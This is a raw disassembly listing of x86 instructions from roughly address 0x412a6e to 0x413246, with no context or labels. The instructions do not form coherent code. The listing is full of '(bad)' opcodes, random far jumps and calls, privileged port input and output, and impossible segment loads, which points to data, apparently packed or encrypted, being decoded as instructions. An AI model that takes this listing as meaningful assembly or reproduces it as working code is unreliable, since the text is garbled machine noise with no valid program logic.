  412a6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a6f:	sti    
  412a70:	stc    
  412a71:	mov    eax,0x87ac83f2
  412a76:	retf   
  412a77:	mov    DWORD PTR [edi+esi*2+0x50],ebp
  412a7b:	mov    edx,DWORD PTR [edx+0x79]
  412a7e:	push   ebx
  412a7f:	fidivr DWORD PTR [edx]
  412a81:	and    cl,0xbf
  412a84:	inc    ecx
  412a85:	test   al,0xf4
  412a87:	(bad)  
  412a88:	outs   dx,DWORD PTR ds:[esi]
  412a89:	push   es
  412a8a:	in     eax,0x1
  412a8c:	in     al,dx
  412a8d:	sub    BYTE PTR [ebp-0x56],cl
  412a90:	push   ecx
  412a91:	mov    esi,0x621c7dad
  412a96:	and    ebp,ebx
  412a98:	lods   al,BYTE PTR ds:[esi]
  412a99:	shr    BYTE PTR [ebx-0x42fb3ad6],cl
  412a9f:	loope  0x412a99
  412aa1:	or     ebx,DWORD PTR [eax]
  412aa3:	cmp    bl,BYTE PTR [ebx]
  412aa5:	cdq    
  412aa6:	test   al,0x7
  412aa8:	sbb    al,0x46
  412aaa:	bound  ebp,QWORD PTR [ebx-0x2b0dc63c]
  412ab0:	in     eax,0x60
  412ab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ab3:	sahf   
  412ab4:	xlat   BYTE PTR ds:[ebx]
  412ab5:	cmc    
  412ab6:	adc    BYTE PTR [ebx+0x1b27fafd],ah
  412abc:	test   eax,0x7647cca5
  412ac1:	or     eax,0xdd3da613
  412ac6:	adc    eax,0x759ec423
  412acb:	mov    cs,esi
  412acd:	inc    edi
  412ace:	xor    DWORD PTR ds:0xe048632a,ebp
  412ad4:	mov    eax,esp
  412ad6:	mov    dl,0x44
  412ad8:	mov    ecx,0xd50e2641
  412add:	es mov dh,0xd8
  412ae0:	mov    bh,BYTE PTR [ebx]
  412ae2:	jno    0x412a9f
  412ae4:	xchg   BYTE PTR [ebx+0x4e5ea61e],al
  412aea:	lahf   
  412aeb:	pop    esp
  412aec:	cmp    eax,0xbcf0933c
  412af1:	jmp    0xb34d:0xf2bf3656
  412af8:	xchg   DWORD PTR [eax+0x7656b2af],esp
  412afe:	adc    eax,0x174adde5
  412b03:	mov    esp,0x25074c43
  412b08:	rcr    DWORD PTR [esi-0x57],cl
  412b0b:	xchg   esi,eax
  412b0c:	pop    ss
  412b0d:	in     al,dx
  412b0e:	loopne 0x412b8f
  412b10:	push   ss
  412b11:	in     eax,0x44
  412b13:	cs cwde 
  412b15:	ja     0x412b28
  412b17:	jg     0x412aeb
  412b19:	and    DWORD PTR [eax],0xffffff9e
  412b1c:	fisttp QWORD PTR [ecx]
  412b1e:	ins    BYTE PTR es:[edi],dx
  412b1f:	js     0x412b69
  412b21:	inc    esi
  412b22:	das    
  412b23:	or     dh,dl
  412b25:	sbb    eax,0xd39c41
  412b2a:	sub    esp,DWORD PTR [edi]
  412b2c:	std    
  412b2d:	stc    
  412b2e:	je     0x412b11
  412b30:	pop    es
  412b31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b32:	call   0xa6c1942
  412b37:	pop    ebp
  412b38:	gs and eax,0xbb68665a
  412b3e:	add    eax,0xf1219ea4
  412b43:	imul   dh
  412b45:	push   es
  412b46:	aam    0x93
  412b48:	arpl   WORD PTR [eax],si
  412b4a:	mov    eax,0xa261b3bd
  412b4f:	and    DWORD PTR [edx+0x38],edx
  412b52:	pop    es
  412b53:	nop
  412b54:	stos   DWORD PTR es:[edi],eax
  412b55:	popf   
  412b56:	sub    bl,0x4c
  412b59:	idiv   cl
  412b5b:	mov    dl,dh
  412b5d:	js     0x412b7b
  412b5f:	xor    al,0x4b
  412b61:	jecxz  0x412bbd
  412b63:	cld    
  412b64:	lea    esi,[ecx-0x1887c070]
  412b6a:	push   cs
  412b6b:	cli    
  412b6c:	std    
  412b6d:	push   ecx
  412b6e:	mov    eax,ds:0xdf61e7c5
  412b73:	xchg   edx,eax
  412b74:	mov    ebp,eax
  412b76:	jbe    0x412bec
  412b78:	pop    ecx
  412b79:	jbe    0x412b5c
  412b7b:	mov    ebx,0x8c2c86eb
  412b80:	arpl   WORD PTR [esi],di
  412b82:	and    edi,DWORD PTR [eax-0x5c]
  412b85:	pushf  
  412b86:	mov    ds:0x15021f5a,al
  412b8b:	sub    cl,bh
  412b8d:	mov    al,ds:0x125d5ff6
  412b92:	leave  
  412b93:	loopne 0x412b71
  412b95:	ss stc 
  412b97:	les    esp,FWORD PTR [eax-0x4e4226d2]
  412b9d:	fild   DWORD PTR [esi-0x5dea3aa0]
  412ba3:	popf   
  412ba4:	sub    eax,0xb154a507
  412ba9:	loopne 0x412be7
  412bab:	bound  ebp,QWORD PTR [ebp+0x1f]
  412bae:	adc    al,dl
  412bb0:	add    DWORD PTR [ebx+0x49],ebp
  412bb3:	or     BYTE PTR [edi+0x8747a3],dl
  412bb9:	xor    eax,0x4a75f0bd
  412bbe:	test   eax,0xf740054b
  412bc3:	jne    0x412b76
  412bc5:	nop
  412bc6:	mov    ebp,0xdd0020a7
  412bcb:	ja     0x412bd3
  412bcd:	daa    
  412bce:	(bad)  [ebx-0x30]
  412bd1:	outs   dx,BYTE PTR ds:[esi]
  412bd2:	ins    DWORD PTR es:[edi],dx
  412bd3:	div    DWORD PTR [edi]
  412bd5:	aaa    
  412bd6:	cdq    
  412bd7:	sub    eax,0x60aa1cfa
  412bdc:	mov    edx,0x2a304528
  412be1:	pop    ebp
  412be2:	inc    ecx
  412be3:	test   BYTE PTR [edi-0x7b8d84bf],bh
  412be9:	xchg   ebp,eax
  412bea:	scas   al,BYTE PTR es:[edi]
  412beb:	add    ch,BYTE PTR [edx+edx*1]
  412bee:	gs adc al,0x80
  412bf1:	xor    eax,0xd1634da2
  412bf6:	cmp    ebx,DWORD PTR [eax+0x52475580]
  412bfc:	das    
  412bfd:	aam    0xa
  412bff:	shl    BYTE PTR [edx+0x60],1
  412c02:	aaa    
  412c03:	dec    ebp
  412c04:	sub    bh,BYTE PTR [edi-0x7b180437]
  412c0a:	xor    bl,BYTE PTR [eax-0x419f0c74]
  412c10:	sbb    BYTE PTR [ecx+0x4eb554e9],al
  412c16:	jecxz  0x412c80
  412c18:	jg     0x412beb
  412c1a:	and    BYTE PTR [edi],dl
  412c1c:	cmp    DWORD PTR [ebx+eiz*2],esp
  412c1f:	inc    ebp
  412c20:	sbb    dh,ah
  412c22:	cli    
  412c23:	xor    al,0xf2
  412c25:	fs ins BYTE PTR es:[edi],dx
  412c27:	mov    ds:0x93cbd773,eax
  412c2c:	add    al,0x21
  412c2f:	lods   eax,DWORD PTR ds:[esi]
  412c30:	inc    esp
  412c31:	jns    0x412c6e
  412c33:	repz in eax,dx
  412c35:	fimul  WORD PTR [edx-0x77]
  412c38:	lahf   
  412c39:	xchg   esi,eax
  412c3a:	or     dl,cl
  412c3c:	mov    eax,0xe976d0a
  412c41:	mov    bl,0xe1
  412c43:	pop    eax
  412c44:	push   esi
  412c45:	jbe    0x412c27
  412c47:	jo     0x412bef
  412c49:	es icebp 
  412c4b:	sbb    eax,0x7f4699fd
  412c50:	and    ebp,DWORD PTR [edi+0x6]
  412c53:	adc    BYTE PTR [ebx+ecx*4+0x762e7f6f],ah
  412c5a:	je     0x412cc8
  412c5c:	pop    edx
  412c5d:	mov    ecx,cs
  412c5f:	cmc    
  412c60:	push   0xd
  412c62:	fisttp QWORD PTR [ebx+0x5ef2d872]
  412c68:	(bad)  
  412c69:	mov    dl,0xe6
  412c6b:	lahf   
  412c6c:	pop    esp
  412c6d:	jo     0x412c60
  412c6f:	mov    WORD PTR [edi-0x383259b4],ds
  412c75:	mov    esi,0x9d914da2
  412c7a:	and    BYTE PTR ds:0x8f407394,dl
  412c80:	mov    cl,0xb8
  412c82:	cmc    
  412c83:	(bad)  
  412c84:	fcom   DWORD PTR [edi-0x1d]
  412c87:	sahf   
  412c88:	lock add al,0xa1
  412c8b:	add    eax,0x5911c7ae
  412c90:	or     eax,DWORD PTR [edx-0x2ef9d991]
  412c96:	rcl    BYTE PTR [ebx+0x1bd3946d],cl
  412c9c:	out    dx,eax
  412c9d:	cmp    al,0x6
  412c9f:	ficom  DWORD PTR [eax+0x2928c7c7]
  412ca5:	mov    ah,0x20
  412ca7:	sub    al,0xf
  412ca9:	sub    edx,DWORD PTR [esi-0x841c49d]
  412caf:	inc    ebp
  412cb0:	xor    al,0x1c
  412cb2:	arpl   WORD PTR [ebx+0x696fefb3],ax
  412cb8:	enter  0xf9a2,0x8d
  412cbc:	call   0x9cca:0xbc4901ae
  412cc3:	sub    bl,BYTE PTR [ecx+edx*2+0x53eb458c]
  412cca:	jb     0x412ce0
  412ccc:	add    edx,DWORD PTR [edx-0x5e08fcb6]
  412cd2:	pop    es
  412cd3:	jle    0x412d01
  412cd5:	xor    ecx,ebx
  412cd7:	push   cs
  412cd8:	(bad)  
  412cd9:	loop   0x412cc9
  412cdb:	imul   ecx
  412cdd:	in     eax,dx
  412cde:	xchg   esi,eax
  412cdf:	cmc    
  412ce0:	xor    al,0xfe
  412ce2:	fnstsw WORD PTR [edx-0x4eef854]
  412ce8:	rcr    BYTE PTR [bx+di+0x54],cl
  412cec:	out    dx,al
  412ced:	jg     0x412cd4
  412cef:	inc    ecx
  412cf0:	jne    0x412ce9
  412cf2:	mov    dh,0x96
  412cf4:	push   ecx
  412cf5:	cmp    DWORD PTR [edi+0x4f],0xba63c1b9
  412cfc:	pop    esi
  412cfd:	and    ecx,DWORD PTR [ebx]
  412cff:	imul   esi,DWORD PTR [ecx],0xc753fa93
  412d05:	lea    esp,[ebx+0x50]
  412d08:	mov    ebp,0xc80268e0
  412d0d:	add    BYTE PTR [edx],dh
  412d0f:	push   esp
  412d10:	xlat   BYTE PTR ds:[ebx]
  412d11:	popa   
  412d12:	xchg   esi,eax
  412d13:	sbb    al,0xe6
  412d15:	sti    
  412d16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d17:	add    eax,DWORD PTR [ebp+0xd8a8b6f]
  412d1d:	scas   al,BYTE PTR es:[edi]
  412d1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d1f:	(bad)  [edi]
  412d21:	sbb    edi,DWORD PTR [edi]
  412d23:	xor    edx,DWORD PTR [ecx+0x67a24727]
  412d29:	out    dx,eax
  412d2a:	lods   eax,DWORD PTR ds:[esi]
  412d2b:	dec    ecx
  412d2c:	gs pop esp
  412d2e:	test   al,0x26
  412d30:	and    al,BYTE PTR [edx]
  412d32:	xchg   ebp,eax
  412d33:	push   es
  412d34:	test   eax,0x3267738c
  412d39:	xchg   edx,eax
  412d3a:	and    DWORD PTR [ecx+0x0],edi
  412d3d:	pusha  
  412d3e:	jg     0x412d4e
  412d40:	(bad)  
  412d41:	rcl    DWORD PTR [esi],1
  412d43:	fs pop edi
  412d45:	adc    DWORD PTR [edi+0x25dcc2d3],edi
  412d4b:	add    BYTE PTR [ebx-0x9686c41],0x66
  412d52:	nop
  412d53:	sbb    eax,edx
  412d55:	xor    cl,bl
  412d57:	repnz xchg ebx,eax
  412d59:	dec    edi
  412d5a:	jg     0x412d7d
  412d5c:	or     BYTE PTR [ebp+0x4d],al
  412d5f:	ret    
  412d60:	pop    eax
  412d61:	add    BYTE PTR [eax+0x37b2ba3],bl
  412d67:	jno    0x412cff
  412d69:	xchg   esp,eax
  412d6a:	push   0xffffffce
  412d6c:	ror    edx,1
  412d6e:	outs   dx,BYTE PTR ds:[esi]
  412d6f:	test   al,0x84
  412d71:	ins    BYTE PTR es:[edi],dx
  412d72:	jecxz  0x412d03
  412d74:	fild   DWORD PTR [edx+0x54]
  412d77:	lods   al,BYTE PTR ds:[esi]
  412d78:	inc    esi
  412d79:	not    DWORD PTR [ecx]
  412d7b:	cmp    DWORD PTR [edx-0x18],eax
  412d7e:	push   ecx
  412d7f:	jecxz  0x412de0
  412d81:	push   cs
  412d82:	cli    
  412d83:	ror    BYTE PTR [edi+edx*1+0x3888b23f],cl
  412d8a:	es dec ebp
  412d8c:	pop    edi
  412d8d:	pop    es
  412d8e:	or     DWORD PTR [eax-0x12],ebp
  412d91:	mov    ?,WORD PTR [ebx]
  412d93:	int    0x8b
  412d95:	xchg   edi,eax
  412d96:	loopne 0x412d6f
  412d98:	fcmovb st,st(1)
  412d9a:	iret   
  412d9b:	icebp  
  412d9c:	and    DWORD PTR [esi-0x6b],esi
  412d9f:	rol    BYTE PTR [edx+ebp*4],0xa8
  412da3:	jl     0x412e00
  412da5:	push   cs
  412da6:	ds (bad) 
  412da8:	call   0x67d9355d
  412dad:	out    dx,eax
  412dae:	pop    ecx
  412daf:	jp     0x412df0
  412db1:	xor    dh,al
  412db3:	add    eax,0x2376523c
  412db8:	out    0xaa,eax
  412dba:	mov    ebx,DWORD PTR [ebx-0x6d]
  412dbd:	fisubr DWORD PTR [edx+0x44d2947b]
  412dc3:	xchg   ebp,eax
  412dc4:	clc    
  412dc5:	push   esp
  412dc6:	mov    eax,ds:0x49dcd18e
  412dcb:	repz mov eax,0x8ca9f0e3
  412dd1:	test   eax,0xa4f357a8
  412dd6:	inc    esp
  412dd7:	imul   eax,DWORD PTR [ecx-0x20],0x47705ea0
  412dde:	bound  ecx,QWORD PTR [ecx]
  412de0:	(bad)  
  412de1:	fnstcw WORD PTR [edx+0x56]
  412de4:	ret    
  412de5:	nop
  412de6:	ja     0x412db2
  412de8:	fwait
  412de9:	lahf   
  412dea:	push   cs
  412deb:	sti    
  412dec:	sub    BYTE PTR [edx],dl
  412dee:	cmp    esp,DWORD PTR [edx+0xb]
  412df1:	add    DWORD PTR [ebp+0x30a383d0],eax
  412df7:	push   ecx
  412df8:	arpl   WORD PTR [ebp-0x33],di
  412dfb:	cmp    DWORD PTR [ebx],eax
  412dfd:	pop    ebx
  412dfe:	enter  0x7e29,0xe1
  412e02:	and    eax,DWORD PTR [ebp+0x58]
  412e05:	cdq    
  412e06:	mov    ch,0xdf
  412e08:	push   ebx
  412e09:	push   cs
  412e0a:	adc    eax,0x70c2d8a1
  412e0f:	dec    esp
  412e10:	aam    0xa4
  412e12:	enter  0x1fdc,0x3c
  412e16:	dec    esi
  412e17:	xchg   edx,eax
  412e18:	ror    dl,cl
  412e1a:	jl     0x412da1
  412e1c:	cli    
  412e1d:	xchg   esp,eax
  412e1e:	hlt    
  412e1f:	or     DWORD PTR [ebx],0x5a01b32f
  412e25:	loopne 0x412e55
  412e27:	test   al,0xb1
  412e29:	cmp    BYTE PTR [eax-0x6a],bl
  412e2c:	je     0x412dd7
  412e2e:	pop    ds
  412e2f:	into   
  412e30:	not    BYTE PTR [esi]
  412e32:	enter  0xe2a3,0x5d
  412e36:	xlat   BYTE PTR ds:[ebx]
  412e37:	sub    eax,0xb5b20ef5
  412e3c:	cmp    al,0xe6
  412e3e:	loop   0x412de7
  412e40:	mov    esi,0x2fe0194a
  412e45:	(bad)  [ebp-0x34]
  412e48:	test   eax,0x80c2ca4a
  412e4d:	out    dx,al
  412e4e:	push   ebx
  412e4f:	fadd   QWORD PTR [edx-0x50]
  412e52:	push   esi
  412e53:	add    BYTE PTR [ebx],dh
  412e55:	xchg   BYTE PTR [ecx],al
  412e57:	aad    0xb8
  412e59:	test   BYTE PTR [edx+0x3ffbd97c],0xdd
  412e60:	mov    ecx,DWORD PTR [esi]
  412e62:	jb     0x412dfa
  412e64:	repnz inc esp
  412e66:	dec    esi
  412e67:	rcr    DWORD PTR [edi+0x59410b7d],0xc6
  412e6e:	ret    
  412e6f:	or     DWORD PTR [ecx],edi
  412e71:	xchg   ecx,eax
  412e72:	or     ebx,edi
  412e74:	sub    al,0xf3
  412e76:	out    0xf5,al
  412e78:	dec    eax
  412e79:	dec    eax
  412e7a:	data16 std 
  412e7c:	arpl   WORD PTR [eax-0x4bc57cfa],cx
  412e82:	aas    
  412e83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e84:	jo     0x412eda
  412e86:	cmp    al,0x18
  412e88:	stos   BYTE PTR es:[edi],al
  412e89:	xchg   ebx,eax
  412e8a:	pusha  
  412e8b:	hlt    
  412e8c:	and    DWORD PTR [edi+eiz*2-0x5e6a6002],0x1f6edf0f
  412e97:	dec    ebp
  412e98:	repnz fwait
  412e9a:	sub    DWORD PTR [edi+0x4a030e4d],0x4e
  412ea1:	daa    
  412ea2:	push   ds
  412ea3:	xchg   edx,eax
  412ea4:	adc    BYTE PTR [edx],cl
  412ea6:	sbb    BYTE PTR [esi+0x69],dl
  412ea9:	dec    esp
  412eaa:	sbb    al,0x17
  412eac:	fdiv   QWORD PTR [ecx-0x4f]
  412eaf:	pop    edi
  412eb0:	jmp    0xce144a02
  412eb5:	mov    ch,0x9e
  412eb7:	mov    esi,0x29af7bf4
  412ebc:	pop    ds
  412ebd:	add    ebx,ebp
  412ebf:	popa   
  412ec0:	nop    DWORD PTR [edx-0xd]
  412ec4:	mov    esi,ebx
  412ec6:	and    ebp,DWORD PTR [ebx+0x176fca94]
  412ecc:	dec    esp
  412ecd:	pop    edi
  412ece:	push   edx
  412ecf:	(bad)  
  412ed0:	mov    dl,0x9d
  412ed2:	jns    0x412efd
  412ed4:	cmp    edi,DWORD PTR [eax]
  412ed6:	add    ah,BYTE PTR [edi-0x8]
  412ed9:	add    eax,0xa8548ec0
  412ede:	xor    eax,0x5d69c47d
  412ee3:	xchg   edi,eax
  412ee4:	xor    bh,BYTE PTR ds:0xb3492159
  412eea:	jmp    0xde829d31
  412eef:	hlt    
  412ef0:	imul   esi,DWORD PTR [esi+eax*8-0x27c65ba7],0xeaa9866b
  412efb:	iret   
  412efc:	cmp    eax,0x5bf92cd7
  412f01:	push   0x9f983de0
  412f06:	mov    ecx,0xcb3c6354
  412f0b:	adc    ch,ah
  412f0d:	xchg   ch,ah
  412f0f:	sbb    ah,dl
  412f11:	mov    ebx,0xde6a047a
  412f16:	lock xor ch,BYTE PTR [eax+ecx*8+0x1a]
  412f1b:	pop    eax
  412f1c:	add    DWORD PTR [ebx+0x584b4254],ebp
  412f22:	call   0x8aef:0x7df2f6ef
  412f29:	out    0x22,al
  412f2b:	jmp    0xde8b:0x490ddfec
  412f32:	jge    0x412ebb
  412f34:	les    ebx,FWORD PTR [edx]
  412f36:	daa    
  412f37:	out    0x9b,al
  412f39:	inc    esp
  412f3a:	mov    edx,?
  412f3c:	push   eax
  412f3d:	or     ebx,edx
  412f3f:	enter  0x9432,0xeb
  412f43:	ret    
  412f44:	push   0xc
  412f46:	fcomp  QWORD PTR [ecx+ebx*8+0x7011586c]
  412f4d:	rcl    ah,cl
  412f4f:	nop
  412f50:	(bad)  
  412f51:	sub    DWORD PTR es:[ebx-0x4],ecx
  412f55:	xor    BYTE PTR ds:0x4573cc69,bl
  412f5b:	sub    al,0xa8
  412f5d:	and    edi,ebp
  412f5f:	cmp    BYTE PTR [ecx],al
  412f61:	mov    dh,0x3c
  412f63:	(bad)  
  412f64:	aad    0xa9
  412f66:	lock aad 0x28
  412f69:	int3   
  412f6a:	push   0x4673207
  412f6f:	jge    0x412f5d
  412f71:	mov    bh,0x2c
  412f73:	xor    al,0x25
  412f75:	dec    ebp
  412f76:	xchg   DWORD PTR [ebx+ebp*2],ebp
  412f79:	xchg   BYTE PTR [esi+0x15],dh
  412f7c:	mov    eax,0x62b43198
  412f81:	cmpxchg DWORD PTR ds:0xccd9aec4,ebp
  412f88:	sub    al,0x60
  412f8a:	pop    es
  412f8b:	sub    BYTE PTR [ecx],0x5d
  412f8e:	sbb    esi,edi
  412f90:	rcl    BYTE PTR [ecx],cl
  412f92:	in     al,dx
  412f93:	je     0x412fdf
  412f95:	xchg   ecx,eax
  412f96:	arpl   WORD PTR [edi-0x23],dx
  412f99:	pop    ebp
  412f9a:	push   ebx
  412f9b:	in     al,0xbc
  412f9d:	jle    0x412f66
  412f9f:	jbe    0x412f84
  412fa1:	neg    eax
  412fa3:	neg    ah
  412fa5:	test   al,0x7b
  412fa7:	lods   al,BYTE PTR ds:[esi]
  412fa8:	or     al,0xc5
  412faa:	jle    0x412f38
  412fac:	sub    DWORD PTR [ebx],esp
  412fae:	or     esi,DWORD PTR [eax]
  412fb0:	mov    ds:0x63b8da73,eax
  412fb5:	gs pop eax
  412fb7:	test   ah,ah
  412fb9:	outs   dx,DWORD PTR ds:[esi]
  412fba:	sub    DWORD PTR [edi-0x6fc3f043],0xffcc0eae
  412fc4:	and    BYTE PTR [eax-0x6200b321],dl
  412fca:	jb     0x41301c
  412fcc:	jbe    0x412fc2
  412fce:	push   esi
  412fcf:	arpl   WORD PTR [ecx-0x3],bx
  412fd2:	popf   
  412fd3:	cmp    bh,al
  412fd5:	daa    
  412fd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fd7:	cld    
  412fd8:	aam    0x66
  412fda:	push   ss
  412fdb:	inc    esp
  412fdc:	xchg   edi,eax
  412fdd:	retf   0x2700
  412fe0:	xchg   ebp,eax
  412fe1:	ss pop ds
  412fe3:	dec    ecx
  412fe4:	add    eax,0x47f5df6e
  412fe9:	stos   DWORD PTR es:[edi],eax
  412fea:	dec    esp
  412feb:	add    dh,cl
  412fed:	pop    esi
  412fee:	sub    al,0x8
  412ff0:	sub    edx,edi
  412ff2:	mov    ebp,0x3feb1b10
  412ff7:	cwde   
  412ff8:	pslld  mm2,mm7
  412ffb:	(bad)  
  412ffd:	mov    ebp,0x755bef21
  413002:	dec    edx
  413003:	call   0xc205:0x6e23269f
  41300a:	repz xor al,0x38
  41300d:	test   DWORD PTR [esi],esp
  41300f:	push   es
  413010:	mov    esi,DWORD PTR [edx]
  413012:	inc    ecx
  413013:	dec    edx
  413014:	ins    DWORD PTR es:[edi],dx
  413015:	(bad)
  413018:	ret    0xbf79
  41301b:	stc    
  41301c:	pusha  
  41301d:	(bad)  
  41301f:	popf   
  413020:	push   ss
  413021:	inc    esp
  413022:	lea    edx,[esi+0xc158fc3]
  413028:	scas   eax,DWORD PTR es:[edi]
  413029:	fisubr DWORD PTR [edi+0x342ded44]
  41302f:	cmp    dl,BYTE PTR [ebx]
  413031:	mov    dh,0xed
  413033:	adc    eax,0x501f3db1
  413038:	add    eax,0x496bca61
  41303d:	and    eax,0x291d3225
  413042:	push   edi
  413043:	dec    esi
  413044:	fiadd  WORD PTR [ecx]
  413046:	push   ebp
  413047:	jecxz  0x412fd6
  413049:	mov    BYTE PTR [eax-0x734e43db],bh
  41304f:	iret   
  413050:	adc    eax,0x6709ccb5
  413055:	pop    ecx
  413056:	sbb    al,0xd3
  413058:	(bad)  
  413059:	mov    ecx,DWORD PTR [edi-0x76152090]
  41305f:	ret    
  413060:	inc    ebp
  413061:	je     0x41300a
  413063:	(bad)  
  413064:	fild   WORD PTR [edx]
  413066:	stc    
  413067:	jmp    0xde83:0x75f1bf7b
  41306e:	popa   
  41306f:	pop    ebx
  413070:	(bad)  
  413071:	popa   
  413072:	add    al,0xb3
  413074:	xor    ebp,ebx
  413076:	cs add al,0xa6
  413079:	loopne 0x413075
  41307b:	lods   al,BYTE PTR ds:[esi]
  41307c:	or     ebp,eax
  41307e:	test   DWORD PTR ds:0x64d326b,esp
  413084:	dec    esp
  413085:	adc    eax,0x2af13ff
  41308a:	xchg   ebx,eax
  41308b:	add    DWORD PTR [edi+0x7b],esp
  41308e:	cmp    eax,0x2daa8af3
  413093:	sbb    al,ah
  413095:	jecxz  0x413109
  413097:	jne    0x41306d
  413099:	test   BYTE PTR [ecx+0x4fd3c3e4],dl
  41309f:	xor    DWORD PTR [esp+eax*2],ebx
  4130a2:	pop    esi
  4130a3:	cdq    
  4130a4:	cwde   
  4130a5:	pop    es
  4130a6:	in     al,dx
  4130a7:	push   edi
  4130a8:	div    BYTE PTR [ebx+0x39]
  4130ab:	out    0x7,al
  4130ad:	and    esi,DWORD PTR [ebx+0x70]
  4130b0:	and    esi,0xb4c5f005
  4130b6:	mov    esi,DWORD PTR [esi]
  4130b8:	cli    
  4130b9:	inc    ebx
  4130ba:	inc    BYTE PTR [edx+eax*8+0x4ff79ef9]
  4130c1:	imul   edi,ecx,0xda0dd5ff
  4130c7:	out    0xe8,eax
  4130c9:	add    al,0xb9
  4130cb:	xor    dh,BYTE PTR [edx]
  4130cd:	xchg   esp,eax
  4130ce:	or     DWORD PTR [eax+0x3f],esp
  4130d1:	cmp    al,0x2c
  4130d3:	and    DWORD PTR [ebp+0xeac3f25],edx
  4130d9:	xchg   ebx,eax
  4130da:	imul   edi,DWORD PTR [eax+0x58e045e3],0xffffffa3
  4130e1:	push   ebp
  4130e2:	push   ebx
  4130e3:	aaa    
  4130e4:	xchg   al,al
  4130e6:	mov    esp,0x2663a55c
  4130eb:	mov    ss,WORD PTR [ecx+0x45]
  4130ee:	inc    esi
  4130ef:	add    dl,cl
  4130f1:	shr    DWORD PTR ds:0x96d3fa8c,cl
  4130f7:	std    
  4130f8:	cmc    
  4130f9:	jo     0x413130
  4130fb:	adc    ebx,DWORD PTR [edx-0x22c44705]
  413101:	loope  0x413099
  413103:	ds in  al,0x2e
  413106:	mov    BYTE PTR [esi+0x1f],cl
  413109:	add    esi,esp
  41310b:	sub    ebp,edi
  41310d:	lds    edi,FWORD PTR [edx+0x69968234]
  413113:	pop    ebx
  413114:	ins    DWORD PTR es:[edi],dx
  413115:	out    0x65,eax
  413117:	jne    0x4130e9
  413119:	out    dx,eax
  41311a:	fs adc dh,dh
  41311d:	bound  edx,QWORD PTR [edx+0x5]
  413120:	xor    BYTE PTR [edi*2+0x35102943],cl
  413127:	xor    eax,0x9393b67f
  41312c:	sub    eax,0x9e37d22c
  413131:	outs   dx,DWORD PTR ds:[esi]
  413132:	dec    ebx
  413133:	in     al,0x63
  413135:	out    dx,al
  413136:	imul   esi,DWORD PTR [ebx-0xe4767c2],0xffffffd7
  41313d:	les    eax,FWORD PTR [ecx-0x7cad827]
  413143:	push   0xffffffe1
  413145:	data16 out dx,al
  413147:	mov    al,0x7e
  413149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41314a:	cdq    
  41314b:	out    0x77,eax
  41314d:	in     eax,0x15
  41314f:	dec    ecx
  413150:	nop
  413151:	xor    esp,DWORD PTR [ecx-0x2aee94a2]
  413157:	jne    0x4130f9
  413159:	mov    ds:0x7791aaf7,eax
  41315e:	js     0x41319d
  413160:	popa   
  413161:	adc    DWORD PTR [edi],ecx
  413163:	adc    BYTE PTR [ebx+0x23a843cb],0x1b
  41316a:	pop    ebx
  41316b:	dec    esi
  41316c:	bound  esp,QWORD PTR [esi-0x4e56d179]
  413172:	outs   dx,DWORD PTR ds:[esi]
  413173:	inc    ebx
  413174:	jge    0x413104
  413176:	cmp    edi,eax
  413178:	loopne 0x4131f4
  41317a:	mov    ebp,0xe50525a8
  41317f:	xor    al,0x38
  413181:	ds or  dh,ah
  413184:	inc    ebx
  413185:	dec    eax
  413186:	enter  0x30a2,0x30
  41318a:	std    
  41318b:	rcl    DWORD PTR [ecx],cl
  41318d:	es (bad) 
  41318f:	in     al,0x83
  413191:	cmp    BYTE PTR [ebx+0x5c],0x5e
  413195:	adc    DWORD PTR [esp+edx*4+0x5f144269],esp
  41319c:	test   al,0xd1
  41319e:	scas   al,BYTE PTR es:[edi]
  41319f:	xchg   esi,eax
  4131a0:	add    eax,0xac83196c
  4131a5:	leave  
  4131a6:	fs mov ebp,0x3457c735
  4131ac:	loopne 0x4131ff
  4131ae:	cs ret 0x4422
  4131b2:	sbb    edi,DWORD PTR [edx]
  4131b4:	scas   eax,DWORD PTR es:[edi]
  4131b5:	repnz lea ebx,[ecx-0x28150346]
  4131bc:	ins    BYTE PTR es:[edi],dx
  4131bd:	mov    ebx,0xa584ef76
  4131c2:	pop    ebx
  4131c3:	push   ebx
  4131c4:	lds    edx,FWORD PTR [ebp+0x38c993fa]
  4131ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131cb:	inc    ebx
  4131cc:	cmp    ch,BYTE PTR [ebp+eiz*1+0x6d]
  4131d0:	xor    al,dh
  4131d2:	arpl   di,bp
  4131d4:	mov    ebp,0x4193d143
  4131d9:	mov    esp,0x74048298
  4131de:	push   ecx
  4131df:	adc    al,0xb0
  4131e1:	ret    
  4131e2:	sbb    edx,edx
  4131e4:	mov    eax,0xdb448731
  4131e9:	mov    edx,0xeb56ee9a
  4131ee:	pop    eax
  4131ef:	ds cmp eax,0xb284c24f
  4131f5:	jno    0x4131cb
  4131f7:	dec    esi
  4131f8:	cmp    BYTE PTR [esi-0x47],0x77
  4131fc:	scas   al,BYTE PTR es:[edi]
  4131fd:	cmp    ah,bl
  4131ff:	dec    edi
  413200:	ins    DWORD PTR es:[edi],dx
  413201:	loope  0x41325d
  413203:	xor    ah,BYTE PTR [esi]
  413205:	and    DWORD PTR [esi-0x16c8fe63],edi
  41320b:	jns    0x41321a
  41320d:	pop    esp
  41320e:	stos   BYTE PTR es:[edi],al
  41320f:	leave  
  413210:	mov    al,BYTE PTR [ebx-0x54]
  413213:	int3   
  413214:	lods   eax,DWORD PTR ds:[esi]
  413215:	adc    al,0xd5
  413217:	adc    al,0xb
  413219:	mov    al,ds:0xca24e89f
  41321e:	xchg   edi,eax
  41321f:	scas   al,BYTE PTR es:[edi]
  413220:	mov    ebp,0xbbb8ead9
  413225:	fmul   st(3),st
  413227:	sub    eax,0xec27de63
  41322c:	jge    0x41329a
  41322e:	cmp    eax,0xf8d481f0
  413233:	jecxz  0x413218
  413235:	mov    ds:0xec49897b,al
  41323a:	pop    ebp
  41323b:	or     DWORD PTR [ebx],edx
  41323d:	push   0x439cdcef
  413242:	xchg   BYTE PTR [ebx],bh
  413244:	(bad)  
  413245:	(bad)  
  413246:	js     0x4132b9
